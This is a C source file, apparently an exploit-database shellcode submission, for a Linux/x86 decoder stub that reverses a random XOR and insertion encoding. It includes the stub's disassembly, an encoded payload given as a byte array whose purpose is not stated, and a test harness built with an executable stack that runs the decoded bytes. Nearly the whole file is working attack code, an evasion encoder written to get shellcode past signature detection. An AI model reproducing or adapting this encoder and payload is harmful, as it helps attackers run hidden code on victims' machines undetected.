/*
# Title: Linux/x86 - Random Bytewise XOR + Insertion Encoder Shellcode (54 bytes)
# Date: 2018-09-13
# Author: Ray Doyle (@doylersec)
# Homepage: https://www.doyler.net
# Tested on: Linux/x86
# gcc -o xor_encoded_shellcode -z execstack -fno-stack-protector xor_encoded_shellcode.c
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 2f                	jmp    8048091 <find_address>

08048062 <decoder>:
 8048062:	5f                   	pop    edi
 8048063:	57                   	push   edi
 8048064:	5e                   	pop    esi

08048065 <get_key>:
 8048065:	8a 07                	mov    al,BYTE PTR [edi]
 8048067:	6a 90                	push   0xffffff90
 8048069:	5b                   	pop    ebx
 804806a:	3c aa                	cmp    al,0xaa
 804806c:	74 0a                	je     8048078 <decode_insertion>
 804806e:	30 d8                	xor    al,bl

08048070 <decode_xor>:
 8048070:	30 07                	xor    BYTE PTR [edi],al
 8048072:	47                   	inc    edi
 8048073:	30 07                	xor    BYTE PTR [edi],al
 8048075:	47                   	inc    edi
 8048076:	eb ed                	jmp    8048065 <get_key>

08048078 <decode_insertion>:
 8048078:	8d 3e                	lea    edi,[esi]
 804807a:	31 c0                	xor    eax,eax
 804807c:	31 db                	xor    ebx,ebx

0804807e <insertion_decoder>:
 804807e:	8a 1c 06             	mov    bl,BYTE PTR [esi+eax*1]
 8048081:	80 f3 90             	xor    bl,0x90
 8048084:	75 10                	jne    8048096 <encoded>
 8048086:	8a 5c 06 01          	mov    bl,BYTE PTR [esi+eax*1+0x1]
 804808a:	88 1f                	mov    BYTE PTR [edi],bl
 804808c:	47                   	inc    edi
 804808d:	04 02                	add    al,0x2
 804808f:	eb ed                	jmp    804807e <insertion_decoder>

08048091 <find_address>:
 8048091:	e8 cc ff ff ff       	call   8048062 <decoder>

08048096 <encoded>:
 8048096:	b7 cc                	mov    bh,0xcc
 8048098:	3d ba 0a ab f3       	cmp    eax,0xf3ab0aba
 804809d:	a3 9b bb 01 95       	mov    ds:0x9501bb9b,eax
 80480a2:	75 d4                	jne    8048078 <decode_insertion>
 80480a4:	bc f7 fa d9 1c       	mov    esp,0x1cd9faf7
 80480a9:	8d                   	(bad)
 80480aa:	d5 1c                	aad    0x1c
 80480ac:	f7 56 73             	not    DWORD PTR [esi+0x73]
 80480af:	31 ef                	xor    edi,ebp
 80480b1:	cd a9                	int    0xa9
 80480b3:	34 12                	xor    al,0x12
 80480b5:	4f                   	dec    edi
 80480b6:	50                   	push   eax
 80480b7:	40                   	inc    eax
 80480b8:	71 d0                	jno    804808a <insertion_decoder+0xc>
 80480ba:	94                   	xchg   esp,eax
 80480bb:	c4                   	(bad)
 80480bc:	f7 d7                	not    edi
 80480be:	7f ee                	jg     80480ae <encoded+0x18>
 80480c0:	62                   	(bad)
 80480c1:	c3                   	ret
 80480c2:	48                   	dec    eax
 80480c3:	03 d3                	add    edx,ebx
 80480c5:	8e 76 66             	mov    ?,WORD PTR [esi+0x66]
 80480c8:	2c 54                	sub    al,0x54
 80480ca:	0c 78                	or     al,0x78
 80480cc:	05 6a 37 58 e4       	add    eax,0xe458376a
 80480d1:	8b dc                	mov    ebx,esp
 80480d3:	04 3b                	add    al,0x3b
 80480d5:	ce                   	into
 80480d6:	b6 4a                	mov    dh,0x4a
 80480d8:	af                   	scas   eax,DWORD PTR es:[edi]
 80480d9:	53                   	push   ebx
 80480da:	59                   	pop    ecx
 80480db:	a6                   	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80480dc:	b5 05                	mov    ch,0x5
 80480de:	f7 30                	div    DWORD PTR [eax]
 80480e0:	15 ea eb 09 9c       	adc    eax,0x9c09ebea
 80480e5:	60                   	pusha
 80480e6:	e4 10                	in     al,0x10
 80480e8:	7d cc                	jge    80480b6 <encoded+0x20>
 80480ea:	56                   	push   esi
 80480eb:	cc                   	int3
 80480ec:	aa                   	stos   BYTE PTR es:[edi],al
****************************************************/

#include<stdlib.h>
#include<stdio.h>
#include<string.h>

unsigned char stub[] = \
"\xeb\x31\x5f\x57\x5e\x8a\x07\x6a\x90\x5b\x3c\xaa\x74\x0a\x30\xd8\x30\x07\x47\x30\x07\x47\xeb\xed\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xf3\x90\x75\x12\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xff\xe6\xe8\xca\xff\xff\xff";

unsigned char shellcode[] = \
"\xb7\xcc\x3d\xba\x0a\xab\xf3\xa3\x9b\xbb\x01\x95\x75\xd4\xbc\xf7\xfa\xd9\x1c\x8d\xd5\x1c\xf7\x56\x73\x31\xef\xcd\xa9\x34\x12\x4f\x50\x40\x71\xd0\x94\xc4\xf7\xd7\x7f\xee\x62\xc3\x48\x03\xd3\x8e\x76\x66\x2c\x54\x0c\x78\x05\x6a\x37\x58\xe4\x8b\xdc\x04\x3b\xce\xb6\x4a\xaf\x53\x59\xa6\xb5\x05\xf7\x30\x15\xea\xeb\x09\x9c\x60\xe4\x10\x7d\xcc\x56\xcc\xaa";

unsigned char* code;

main()
{
    printf("\nStub Length: %d\n", strlen(stub));
    printf("Shellcode Length: %d\n\n", strlen(shellcode));

    printf("Total Length: %d\n\n", strlen(stub) + strlen(shellcode));

    code = malloc(strlen(stub) + strlen(shellcode));
    memcpy(code, stub, strlen(stub));
    memcpy(&code[strlen(stub)], shellcode, strlen(shellcode));

    int (*ret)() = (int(*)())code;

    ret();
}